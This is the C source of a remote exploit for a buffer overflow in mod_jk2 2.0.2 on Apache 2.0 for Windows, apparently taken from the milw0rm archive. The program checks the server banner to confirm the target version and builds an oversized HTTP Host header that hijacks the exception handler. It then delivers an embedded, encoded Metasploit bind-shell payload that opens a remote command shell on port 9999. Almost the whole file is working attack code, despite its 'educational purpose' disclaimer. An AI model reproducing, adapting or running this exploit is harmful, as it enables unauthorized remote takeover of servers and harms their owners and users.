/* Dreatica-FXP crew
* 
* ----------------------------------------
* Target         : mod_jk2 v2.0.2 for Apache 2.0 Win32  
* Found by       : IOActive Security Advisory
* ----------------------------------------
* Exploit        : mod_jk2 v2.0.2 Buffer Overflow Exploit (win32)
* Exploit date   : 01.03.2008 - 02.03.2008
* Exploit writer : Heretic2 (heretic2x@gmail.com)
* OS             : Windows ALL 
* Crew           : Dreatica-FXP
* ----------------------------------------
* Info           : Exploit was found by IOActive Security Advisory, trivial exploit for win32.
*                  The only problem here is that the mod_jk2 forstly downcase all letter in Host
*                  header request, Metasploit v3 have solutions for this case:
*                     1. Use non-upper encoder
*                     2. Use non-alpha encoder
*                  i used the first variant here. and all is working good.
* ----------------------------------------
* Thanks to:
*       1. IOActive Security Advisory  (                                                        )
*       2. The Metasploit project      ( http://metasploit.com                                  ) 
*       3. Dreatica-FXP crew           (                                                        )
* ----------------------------------------
* This was written for educational purpose only. Use it at your own risk. Author will be not be 
* responsible for any damage, caused by that code.
************************************************************************************
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ctime>
#pragma comment(lib,"ws2_32")


void usage(char * s);
void logo();
void end_logo();
void prepare_shellcode(unsigned char * fsh, int sh, char * cbip, int cbport, char * url);
void make_buffer(unsigned char * buf, unsigned int * len, int itarget, int sh);
int get_version(char * remotehost, int port, int * itarget);
int validate_args(char * remotehost, int port, int sh, int itarget);
int send_buffer(unsigned char * buf, unsigned int len, char * remotehost, int port);
SOCKET do_connect (char *remotehost, int port);


// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring);
char	*optarg;		// global argument pointer
int		optind = 0, opterr; 	// global argv index
// -----------------------------------------------------------------
// -----------------------------------------------------------------




struct _target{
	const char *t ;
	unsigned long ret ;
} targets[]=
{	
	{"mod_jk2/2.0.2 for Apache 2.0.48",  0x100115c3 },// pop,pop,ret	
	{NULL,                               0x00000000 }
};



struct {
	const char * name;
	int length;
	char * shellcode;	
}shellcodes[]={ 	
	{"Bindshell, port 9999", 461, 		
	/*
	* windows/shell_bind_tcp - 461 bytes
	* http://www.metasploit.com
	* Encoder: x86/nonalpha
	* EXITFUNC=seh, LPORT=9999
	*/
		"\x66\xb9\xff\xff\xeb\x19\x5e\x8b\xfe\x83\xc7\x6c\x8b\xd7\x3b"
		"\xf2\x7d\x0b\xb0\x7b\xf2\xae\xff\xcf\xac\x28\x07\xeb\xf1\xeb"
		"\x71\xe8\xe2\xff\xff\xff\x11\x2e\x0f\x36\x03\x2c\x32\x07\x27"
		"\x06\x15\x30\x0f\x1a\x17\x38\x0b\x13\x2d\x2b\x15\x28\x15\x13"
		"\x13\x04\x08\x27\x13\x2b\x15\x26\x11\x13\x24\x28\x28\x28\x28"
		"\x28\x38\x28\x38\x28\x15\x13\x15\x28\x13\x0b\x24\x11\x2a\x26"
		"\x13\x24\x28\x26\x13\x32\x32\x24\x2b\x27\x27\x26\x13\x02\x02"
		"\x24\x26\x15\x11\x17\x15\x13\x18\x0e\x11\x2b\x22\x11\x37\x39"
		"\x39\x01\x13\x09\x06\x37\x24\x29\x2a\x2a\x2a\x11\x2a\x2a\x26"
		"\x2a\x13\x28\x11\x24\x17\x29\x13\x28\xfc\x7b\xeb\x7b\xe8\xf9"
		"\xff\xff\xff\x60\x8b\x7b\x24\x24\x8b\x7b\x3c\x8b\x7c\x05\x7b"
		"\x01\xef\x8b\x7b\x18\x8b\x5f\x20\x01\xeb\x7b\x8b\x34\x8b\x01"
		"\xee\x31\xc0\x99\xac\x84\xc0\x7b\x07\xc1\xca\x0d\x01\xc2\xeb"
		"\xf4\x3b\x7b\x24\x28\x7b\xe5\x8b\x5f\x24\x01\xeb\x7b\x8b\x0c"
		"\x7b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x7b\x24\x1c\x7b\xc3"
		"\x31\xdb\x7b\x8b\x7b\x30\x8b\x40\x0c\x8b\x7b\x1c\xad\x8b\x40"
		"\x08\x5e\x7b\x8e\x7b\x0e\xec\x7b\xff\xd6\x7b\x7b\x7b\x7b\x33"
		"\x32\x7b\x7b\x7b\x32\x5f\x7b\xff\xd0\x7b\xcb\xed\xfc\x3b\x7b"
		"\xff\xd6\x5f\x89\xe5\x7b\x81\xed\x08\x02\x7b\x7b\x02\xff\xd0"
		"\x7b\xd9\x09\xf5\xad\x7b\xff\xd6\x7b\x7b\x7b\x7b\x7b\x7b\x7b"
		"\x7b\x7b\xff\xd0\x7b\x7b\x27\x0f\x7b\x7b\x89\xe1\x95\x7b\xa4"
		"\x1a\x7b\xc7\x7b\xff\xd6\x7b\x10\x7b\x7b\xff\xd0\x7b\xa4\xad"
		"\x2e\xe9\x7b\xff\xd6\x7b\x7b\xff\xd0\x7b\xe5\x7b\x86\x7b\x7b"
		"\xff\xd6\x7b\x7b\x7b\x7b\xff\xd0\x93\x7b\xe7\x7b\xc6\x7b\x7b"
		"\xff\xd6\x7b\xff\xd0\x7b\x7b\x7b\x7b\x7b\x7b\x7b\x89\xe5\x7b"
		"\x7b\x7b\x29\xcc\x89\xe7\x7b\x7b\x89\xe2\x31\xc0\xf3\xaa\xfe"
		"\x7b\x2d\xfe\x7b\x2c\x93\x8d\x7b\x38\xab\xab\xab\x7b\x7b\xfe"
		"\xb3\x16\xff\x7b\x7b\xff\xd6\x5b\x7b\x7b\x7b\x7b\x7b\x7b\x01"
		"\x7b\x7b\x7b\x7b\xff\xd0\x7b\xad\xd9\x05\xce\x7b\xff\xd6\x7b"
		"\xff\xff\x37\xff\xd0\x8b\x7b\xfc\x83\xc4\x7b\xff\xd6\x7b\xff"
		"\xd0\x7b\xf0\x8a\x04\x5f\x7b\xff\xd6\xff\xd0"
	 },	  
	{NULL , NULL }
};








int main(int argc, char **argv)
{
	char * remotehost=NULL;
	char default_remotehost[]="127.0.0.1";	
	char temp1[100], temp2[100];
	int port, itarget, x, sh;
	SOCKET s;
	char c;	
	int option_index=0;
	logo();
	WSADATA wsa;
	WSAStartup(MAKEWORD(2,0), &wsa);
	if(argc<2)
	{
		usage(argv[0]);		
		return -1;
	}

	// set defaults
	port=80;
	itarget=-1;
	sh=0;
	// ------------	
	
	while((c = getopt(argc, argv, "h:p:"))!= EOF)
	{
		switch (c)
		{
			case 'h':
				remotehost=optarg;
				break; 				
			case 'p':
				sscanf(optarg, "%d", &port);
				break;			
			default:
	            usage(argv[0]);
				WSACleanup();
			return -1;
		}		 
	}	
	if(remotehost == NULL) remotehost=default_remotehost;
	memset(temp1,0,sizeof(temp1));
	memset(temp2,0,sizeof(temp2));
	memset(temp1, '\x20' , 58 - strlen(remotehost) -1);	
	printf(" #  Host    : %s%s# \n", remotehost, temp1);	
	sprintf(temp2, "%d", port);
	memset(temp1,0,sizeof(temp1));
	memset(temp1, '\x20' , 58 - strlen(temp2) -1);
	printf(" #  Port    : %s%s# \n", temp2, temp1);
	memset(temp1,0,sizeof(temp1));	
	memset(temp2,0,sizeof(temp2));
	sprintf(temp2, "%s", shellcodes[sh].name );
	memset(temp1, '\x20' , 58 - strlen(temp2) -1);	
	printf(" #  Payload : %s%s# \n", temp2, temp1);	


	printf(" # ------------------------------------------------------------------- # \n");
	fflush(stdout);
	printf("   [+] Checking if server is online\n");
	fflush(stdout);
	s=do_connect(remotehost, port);   
	if(s==-1)
	{
		printf("   [-] Server is OFFLINE\n");
		end_logo();
		return 0;
	}
	closesocket(s);
	printf("   [+] Server is ONLINE\n");

	x = get_version(remotehost, port, &itarget);
	if(x<0)
	{
		printf("   [-] Cannot exploit due to errors\n");
		WSACleanup();
		end_logo();
		return -1;		
	}
		
		
	unsigned char buf[10000];
	unsigned int len;
	memset(buf,0,sizeof(buf));
	fflush(stdout);
	make_buffer(buf, &len, itarget, sh);

	printf("   [+] Attacking buffer constructed\n");

	if(send_buffer(buf, len, remotehost,port)==-1)
	{
		printf("   [-] Cannot exploit server %s\n", remotehost);
		end_logo();
		WSACleanup();
		return -1;
	}

	printf("   [+] Buffer sent\n");
	printf("   [+] Connect to %s:%d\n", remotehost, 9999);
		
	end_logo();
	WSACleanup();
	return 0;
}



SOCKET do_connect (char *remotehost, int port)
{
	static struct hostent *host;
	static struct sockaddr_in addr;
	SOCKET s;	
	host = gethostbyname(remotehost);
	if (!host)
	{
		perror("   [-] gethostbyname() failed");
		return -1;
	}
	addr.sin_addr = *(struct in_addr*)host->h_addr;

	s = socket(PF_INET, SOCK_STREAM, 0);
	if (s == -1)
	{
		closesocket(s);
		perror("socket() failed");
		return -1;
	}
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;
	if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == -1)
	{
		closesocket(s);     
		return -1;
	}
	return s;
}



int get_version(char * remotehost, int port, int * target)
{
	
	char bufmax[4096], * lp, *lp2, WebBanner[1000], Version[1000], ModJK[1000];
	int bytes,j,x;
	SOCKET sock;

	memset(bufmax,0,sizeof(bufmax));
	memset(WebBanner,0,sizeof(WebBanner));
	memset(Version,0,sizeof(Version));
	memset(ModJK,0,sizeof(ModJK));
	sock = do_connect(remotehost, port);

	if (sock == -1) return -1;
	send(sock, "GET /a.html HTTP/1.0\r\n\r\n",(int)strlen("GET /a.html HTTP/1.0\r\n\r\n"),0);
	
	if ((bytes = recv(sock, bufmax, sizeof(bufmax),0 )) <= 0) return -1;
	bufmax[sizeof(bufmax)-1]=0;

	if((lp=strstr(bufmax,"Server:"))==NULL) return -1;
	if((lp2=strstr(lp,"\r\n"))==NULL) return -1;

	strncpy(WebBanner, lp, lp2-lp);
	if((lp=strstr(WebBanner,"Win32"))==NULL) 
	{
		printf("   [-] OS is not a Win32\n");
		return -1;
	}

	if((lp=strstr(WebBanner,"Apache/"))==NULL)
	{
		printf("   [-] No Apache\n");
		return -1;
	}
	if(lp+strlen("Apache/")>WebBanner+strlen(WebBanner)-1) return -1;
	lp+=strlen("Apache/");
	if((lp2=strstr(lp," "))==NULL) return -1;

	strncpy(Version, lp, lp2-lp);

	printf("   [+] Version of Apache is %s\n", Version);

	x=0;
	for(j=0; targets[j].t!=0;j++)
	{
		if(strstr(targets[j].t,Version)!=NULL)
		{			
			x=1;
			break;
		}
	}
	if(x==0)
	{
		printf("   [-] This version of Apache is UNSUPPORTED\n");
		return -1;
	}
	printf("   [+] This version of Apache is SUPPORTED\n");

	strncpy(WebBanner, lp, lp2-lp);

	if((lp=strstr(WebBanner,"mod_jk2/"))==NULL) 
	{
		printf("   [-] No mod_jk2\n");
		return -1;
	}
	if((lp2=strstr(lp," "))==NULL) lp2=WebBanner+strlen(WebBanner);

	strncpy(ModJK, lp, lp2-lp);

	printf("   [+] mod_jk2 is %s\n", ModJK);
	x=0;
	for(j=0; targets[j].t!=0;j++)
	{
		if(strstr(targets[j].t,ModJK)!=NULL)
		{
			*target=j;
			x=1;
			break;
		}
	}
	if(x==0)
	{
		printf("   [-] This version of mod_jk2 is UNSUPPORTED\n");
		return -1;
	}
	printf("   [+] This version of mod_jk2 is SUPPORTED\n");
	return 0;
}


void prepare_shellcode(unsigned char * fsh, unsigned int * fshlength, int sh)
{
	memcpy(fsh, shellcodes[sh].shellcode, shellcodes[sh].length);
	*fshlength = shellcodes[sh].length;	
}

void make_buffer(unsigned char * buf, unsigned int * len, int itarget, int sh)
{
		// prepare shellcode
	unsigned char fsh[10000];	
	unsigned int fshlength;
	memset(fsh, 0, sizeof(fsh));	
	prepare_shellcode(fsh, &fshlength, sh);
	// -----------------

		// make buffer
	unsigned char * cp=buf;

		// begin of the HTTP request
	memcpy(cp, "GET / HTTP/1.0\r\nHost: ", strlen("GET / HTTP/1.0\r\nHost: ") );		
	cp+=strlen((char *)cp);
	
		// jff
	*cp++='\x90';
	*cp++='\x90';
	*cp++='\x90';
	*cp++='\x90';

		// overflowing
	memset(cp, '\x41', 5001);

		// put the shellcode
	memcpy(cp, fsh, fshlength);
	cp+=1271;

		// calculating backward jump
	int jmp_bytes=0xffffffff - (1275);

		// putting backward jump
	*cp++ = '\xe9';	
	*cp++ = (char)((jmp_bytes      ) & 0xff);
	*cp++ = (char)((jmp_bytes >>  8) & 0xff);
	*cp++ = (char)((jmp_bytes >> 16) & 0xff);
	*cp++ = (char)((jmp_bytes >> 24) & 0xff);

		// next SEH record and back jump
	*cp++='\x90';
	*cp++='\x90';
	*cp++='\xeb';
	*cp++='\xf7';

		// replace SEH
	*cp++ = (char)((targets[itarget].ret      ) & 0xff);
	*cp++ = (char)((targets[itarget].ret >>  8) & 0xff);
	*cp++ = (char)((targets[itarget].ret >> 16) & 0xff);
	*cp++ = (char)((targets[itarget].ret >> 24) & 0xff);

		// trigger exception
	cp+=3000;			

		// copy the last part of the request
	memcpy(cp, "\r\n\r\n", strlen("\r\n\r\n") );		
	cp+=strlen((char *)cp);

}



int send_buffer(unsigned char * buf, unsigned int len, char * remotehost, int port)
{	
	SOCKET sock;

	sock = do_connect(remotehost, port);
	
	if (sock<0) return -1;
	if (send(sock, (char *)buf,(int)strlen((char *)buf),0)<=0) return -1;
	
	closesocket(sock);
	return 1;
}






// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring)
{
	static char *next = NULL;
	if (optind == 0)
		next = NULL;

	optarg = NULL;

	if (next == NULL || *next == '\0')
	{
		if (optind == 0)
			optind++;

		if (optind >= argc || argv[optind][0] != '-' || argv[optind][1] == '\0')
		{
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		if (strcmp(argv[optind], "--") == 0)
		{
			optind++;
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		next = argv[optind];
		next++;		// skip past -
		optind++;
	}

	char c = *next++;
	char *cp = strchr(optstring, c);

	if (cp == NULL || c == ':')
		return '?';

	cp++;
	if (*cp == ':')
	{
		if (*next != '\0')
		{
			optarg = next;
			next = NULL;
		}
		else if (optind < argc)
		{
			optarg = argv[optind];
			optind++;
		}
		else
		{
			return '?';
		}
	}

	return c;
}
// -----------------------------------------------------------------
// -----------------------------------------------------------------
// -----------------------------------------------------------------







void usage(char * s)
{	
	printf("\n");
	printf("    Usage: %s -h <host> -p <port>\n", s);
	printf("   -------------------------------------------------------------------\n");
	printf("    Arguments:\n");
	printf("      -h ........ host to attack\n");
	printf("      -p ........ port to use\n");	
	printf("\n");
	printf("    Supported mod_jk versions:\n");
	for(int j=0; targets[j].t!=0;j++)
	{
		printf("      %d. %s\n",j+1, targets[j].t);
	}					
	printf("\n");
	printf("    Execution: %s\n\n", shellcodes[0].name);			
	end_logo();	
}

void logo()
{
	printf("\n\n");
	printf(" ####################################################################### \n");	
	printf(" #     ____                 __  _                  ______  __    _____ #\n");
	printf(" #    / __ \\________  _____/ /_(_)_________       / __/\\ \\/ /   / _  / #\n");
	printf(" #   / / / / ___/ _ \\/ __ / __/ / ___/ __ / ___  / /    \\  /   / // /  #\n");
	printf(" #  / /_/ / / /  ___/ /_// /_/ / /__/ /_// /__/ / _/    /  \\  / ___/   #\n");
	printf(" # /_____/_/  \\___/ \\_,_/\\__/_/\\___/\\__,_/     /_/     /_/\\_\\/_/       #\n");
	printf(" #                                 crew                                #\n");
	printf(" ####################################################################### \n");	
	printf(" #  Exploit : mod_jk2 v2.0.2 for Apache 2.0                            # \n");
	printf(" #  Author  : Heretic2                                                 # \n");
	printf(" #  THANKS  : IOActive and The Metasploit Project                      # \n");
	printf(" #  Research: IOActive Security Advisory                               # \n");
	printf(" #  Version : 1.0                                                      # \n");
	printf(" #  System  : Windows ALL                                              # \n");
	printf(" #  Date    : 01.03.2008 - 02.03.2008                                  # \n");
	printf(" # ------------------------------------------------------------------- # \n");
}

void end_logo()
{
	printf(" # ------------------------------------------------------------------- # \n");
	printf(" #                    Dreatica-FXP crew [Heretic2]                     # \n");	
	printf(" ####################################################################### \n\n");
}

// milw0rm.com [2008-03-31]
